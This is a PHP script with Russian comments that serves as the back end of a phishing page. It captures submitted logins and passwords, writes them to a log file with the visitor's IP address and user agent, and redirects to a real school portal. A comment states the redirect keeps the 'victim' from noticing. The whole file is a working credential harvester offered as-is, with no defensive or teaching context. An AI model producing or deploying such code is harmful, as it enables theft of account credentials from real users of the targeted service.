<?php
// Получаем данные из POST запроса
$raw_data = file_get_contents('php://input');

// Если данные пришли в формате JSON (как чаще всего и бывает)
if ($raw_data) {
    $data = json_decode($raw_data, true);
    if ($data) {
        $login = $data['login'] ?? 'не указан';
        $password = $data['password'] ?? 'не указан';
    } else {
        // Если не JSON, то, возможно, обычный POST (на всякий случай)
        $login = $_POST['login'] ?? 'не указан';
        $password = $_POST['password'] ?? 'не указан';
    }
} else {
    // Обычная POST отправка
    $login = $_POST['login'] ?? 'не указан';
    $password = $_POST['password'] ?? 'не указан';
}

$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'не определен';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'не определен';

// Формируем строку для записи
$log_entry = "Время: $time | IP: $ip | Логин: $login | Пароль: $password | User-Agent: $user_agent\n";

// Сохраняем в файл
file_put_contents('log.txt', $log_entry, FILE_APPEND | LOCK_EX);

// Перенаправляем на реальный сайт, чтобы жертва не заметила подвоха
header('Location: https://myschool.72to.ru/');
exit;
?>